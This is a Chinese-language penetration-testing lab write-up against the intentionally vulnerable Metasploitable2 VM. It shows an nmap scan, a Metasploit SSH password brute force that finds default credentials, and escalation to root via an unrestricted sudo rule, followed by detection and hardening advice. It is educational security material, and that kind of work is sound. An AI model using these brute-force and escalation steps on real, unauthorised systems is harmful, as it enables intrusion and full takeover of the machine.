# OpenSSH 4.7p1 弱口令与提权

> **Metasploitable2 系列** -- 22 端口 SSH 攻击篇。本篇记录通过弱口令爆破获取 OpenSSH 4.7p1 初始访问，再借助 sudo 配置缺陷提权至 root 的完整过程。

---

## 概述

Metasploitable2 的 22 端口运行 OpenSSH 4.7p1。针对该版本无远程代码执行漏洞，攻击路径并不是直接打 SSH 服务本身，而是**弱默认凭证爆破 -> sudo 配置缺陷提权**的组合链。单独看每一环都不严重，合在一起构成一条低阻力、高成功率的入侵路径。

这条路径的教训不在于技术难度，而在于：默认密码不改 + sudo 给了 ALL 权限，比任何零日漏洞都更快让你拿到 root。

---

## 漏洞背景

OpenSSH 4.7p1 于 2007 年随 Debian 8（Ubuntu 8.04 LTS 衍生的服务器版）发布。Metasploitable2 作为教学靶机，使用的是 Ubuntu 8.04 基础系统，保留了以下两个"教学脆弱点"：

- **默认凭证** — `msfadmin` 账户的密码与其用户名相同，且该账户在 `/etc/passwd` 中具有有效 shell（`/bin/bash`）。
- **sudo 配置缺陷** — `/etc/sudoers` 中为 `msfadmin` 配置了 `(ALL) ALL`，允许该普通用户以 root 身份执行任意命令。

这两个问题都不是 OpenSSH 的漏洞，而是系统**运维配置层面**的缺陷。但它们正是攻击者通过 SSH 登录后拿到 root 的直接原因。

OpenSSH 4.7p1 自身也有几个已知问题（CVE-2008-1483 的 X11 转发权限问题、CVE-2007-4752 的 trusted X11 cookie 弱点），但均为非 RCE 的局部缺陷，在 Metasploitable2 场景中不构成利用路径。

---

## 根本原因

### 弱默认凭证

`msfadmin:msfadmin` 存在于 Metasploitable2 镜像中并非偶然 — 该项目明确以"提供可供练习的安全弱点"为目标。攻击者只需一本不长的用户名字典加上 `-e s`（用户名即密码）选项，就极大概率命中。

关键点：这不是"密码可以被猜出来"的字典选择问题，而是**初始部署时未修改默认密码**。很多真实系统因克隆 VM 镜像、Docker 容器而保留默认凭证，与此同理。

### sudo 配置缺陷

`/etc/sudoers` 中配置的语义：

```
msfadmin ALL=(ALL) ALL
```

| 字段 | 含义 |
|------|------|
| `msfadmin` | 适用用户 |
| `ALL` | 可在所有主机上使用 sudo（对于单机无实际约束） |
| `(ALL)` | 可以以任意目标用户身份执行命令（包括 root） |
| `ALL` | 可以执行任意命令 |

本质上给了 `msfadmin` 与 root 完全等价的能力，只需输入自身密码验证身份。这是一条为便利性牺牲安全的典型配置：管理员省去了 `su -` 切换用户的麻烦，代价是任何拿到 `msfadmin` 密码的人都能瞬间提权。

```
[msfadmin密码] -> sudo su -> [root]
```

---

## 触发条件

- 22 端口开放，SSH 服务允许密码认证。
- 攻击者能获取有效的用户名/密码对（如 `msfadmin:msfadmin`）。
- 目标用户拥有 sudo 权限，且 sudo 规则允许 `su` 或以 root 执行 shell。

---

## 影响分析

- 初始访问：`msfadmin` 普通用户 shell（`uid=1000`）。
- 提权后：完全 root 控制（`uid=0`），整机沦陷。
- 途径：一次爆破 + 一条 `sudo su` 命令。

若运维侧有其他加固（移除 sudo 权限、禁用密码登录改用密钥），攻击链会在提权环节断开 — SSH 登录本身只给低权限，危害骤降。

---

## 攻击流程

### 1. 前置侦察

```bash
nmap -sV -p 22 192.168.230.181
```

返回：

```
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
```

版本确认后进入漏洞搜索阶段。

### 2. 漏洞搜索与评估

**msf 内搜索：**

```
search openssh
```

结果：6 个模块，其中仅 `auxiliary/scanner/ssh/ssh_enumusers`（#3）与 OpenSSH 直接相关，但它是用户枚举而非远程利用模块。其余为 Windows 平台模块或后渗透凭据收集。

**Exploit-DB 搜索：**

```bash
searchsploit openssh 4.7
```

结果：该版本的已知 CVE（CVE-2008-1483 X11 转发、CVE-2007-4752 可信 cookie）均为局部缺陷，非 RCE。

**决策：无可用远程利用模块，转向弱口令爆破。**

msf 提供 `auxiliary/scanner/ssh/ssh_login` 作为 SSH 字典爆破工具。

### 3. 利用 — SSH 弱口令爆破

```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.230.181
set USER_FILE /root/0.txt
set PASS_FILE /root/0.txt
set THREADS 4
exploit
```

输出：

```
[+] 192.168.230.181:22 - Success: 'msfadmin:msfadmin'
[*] SSH session 1 opened
```

命中 `msfadmin:msfadmin`。

**为什么 THREADS 设为 4：** OpenSSH 服务端有 `MaxStartups` 机制控制未认证并发连接数，高并发下连接被丢弃会导致正确密码漏报。详见同系列 [[Hydra]] 中 SSH 爆破线程限制分析。

### 4. 接入与会话管理

```
sessions -i 1
```

进入交互式 shell。常用会话命令：

| 命令 | 作用 |
|------|------|
| `sessions -l` | 列出所有活跃会话 |
| `sessions -i <id>` | 进入指定会话 |
| `sessions -k <id>` | 杀掉指定会话 |
| `background` | Ctrl+Z 退回 msfconsole 保留会话 |

### 5. 提权 — sudo 配置缺陷

```
sudo -l
```

输出：

```
User msfadmin may run the following commands on this host:
    (ALL) ALL
```

`(ALL) ALL` 表示 msfadmin 可以以任意用户身份执行任意命令。直接提至 root：

```bash
sudo su
```

密码 `msfadmin`，`id` 输出 `uid=0(root)`。

### 6. 验证

```bash
id
# uid=0(root) gid=0(root)
whoami
# root
```

---

## 同一端口的其他攻击路径

- **用户枚举** — `auxiliary/scanner/ssh/ssh_enumusers` 可基于 SSH 协议响应差异枚举系统有效用户（`malformed packet` 或 `timing attack` 两种模式）。在爆破前先缩减用户表。
- **Hydra 爆破** — 同系列 [[Hydra]] 已覆盖。mfs 的 `ssh_login` 和 Hydra 功能等价，选其一即可。差距在于 mfs 模块爆破结果直接生成 session，后续提权/后渗透在同一框架内完成。
- **密钥爆破** — 若存在已知私钥泄露（如 Metasploitable2 的 `/home/msfadmin/.ssh/` 下可能遗留测试密钥），可直接通过密钥认证登录，绕过密码步骤。

---

## 检测方法

- **认证日志**：`/var/log/auth.log` 中出现大量来自同一源的 `Failed password for ...` 记录（爆破痕迹）。
- **sudo 日志**：`/var/log/auth.log` 中的 `sudo: msfadmin : TTY=pts/0 ; PWD=... ; USER=root ; COMMAND=/bin/su` 记录（提权痕迹）。
- **被动检测**：短时间内同一用户从 `msfadmin` 的 `uid=1000` 变为 `uid=0` 的进程派生树异常。

---

## 防御方案

1. **修改默认密码**（根本性）— 任何 VM / 容器部署后第一件事。Metasploitable2 作为靶机保留了默认凭证，但生产系统绝对不可。
2. **禁用密码登录**（根本性）— 改为密钥认证（`PasswordAuthentication no`）。即使有弱密码，攻击者也无法通过 SSH 使用它。
3. **限制 sudo 权限**（根本性）— 将 `(ALL) ALL` 收紧为仅必要命令的白名单。`msfadmin` 不应被赋予任意命令的 sudo 权限。
4. **MaxStartups 调低 + fail2ban**（缓解性）— 降低并发未认证连接数 + 多次失败后自动封禁源 IP，提高爆破的时间成本。

---

## 经验沉淀

- **不是每个服务都有 RCE exploit。** OpenSSH 4.7p1 没有可用的远程漏洞，但弱口令 + sudo 缺陷组成的攻击链同样拿到 root。渗透测试的价值在于识别当前目标的最短攻击路径，而不是执着于找 exploit。
- **SSH 爆破线程不能开大。** `MaxStartups` 机制是协议层设计，不是 msf 或 Hydra 的工具缺陷。线程高 = 漏报风险高，`-t 4` 用稳健换准确。这条在 21 端口 FTP 爆破时不需要，但 SSH 必须遵守。
- **拿到会话后第一件事不是 `id`，是先 `sessions -l` 确认有几个会话。** 然后 `-i` 进入，再 `id` 确认权限，最后 `sudo -l` 查提权路径。顺序对就不会漏掉同时爆出来的多组凭证。
- **`sudo -l` 是 Linux 提权的第一站。** 不需要一上来就找内核 exploit。很多时候你看不到 `(ALL) ALL`，但能看到 `(root) NOPASSWD: /usr/bin/xxx` — 这条命令可能就是提权的跳板。GTFOBins 是在这一步之后查的，而不是之前。
- **msf 爆破比 Hydra 多一个好处。** 爆破成功后自动创建 session，后续提权、后渗透操作在同一框架内连续执行，不需要在终端之间切换。路径：`ssh_login` -> `sessions -i 1` -> `sudo su`，一气呵成。

---

## 相关 CVE / 参考资料

- OpenSSH 4.7p1 Release Notes: https://www.openssh.com/txt/release-4.7
- Metasploit 模块：`auxiliary/scanner/ssh/ssh_login`、`auxiliary/scanner/ssh/ssh_enumusers`
- GTFOBins (sudo 提权): https://gtfobins.github.io/
